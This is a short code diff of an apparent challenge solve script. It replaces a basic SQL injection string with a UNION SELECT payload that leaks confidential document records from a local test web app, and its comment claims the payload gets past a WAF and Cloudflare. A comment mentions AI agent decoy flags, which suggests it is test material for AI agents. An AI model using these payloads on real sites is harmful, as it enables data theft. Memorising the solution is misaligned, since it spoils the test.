@@ -13,9 +13,9 @@ def solve():
     client = app.test_client()
     
     print("[+] Step 2: Exploiting Web Search via SQL Injection...")
-    # Using query_string dictionary ensures proper URL parameter encoding
-    sqli_payload = "' OR 1=1--"
-    res = client.get("/search", query_string={'q': sqli_payload})
+    # Using Medium-Hard UNION SELECT bypass payload (avoids WAF blacklist and Cloudflare 403)
+    sqli_payload = "%' UNION SELECT title, access_level, file_path, author FROM documents WHERE access_level LIKE '%"
+    res = client.post("/search", data={'q': sqli_payload})
     html = res.data.decode('utf-8')
     
     # Verify confidential document leaked while ignoring AI agent decoy flags
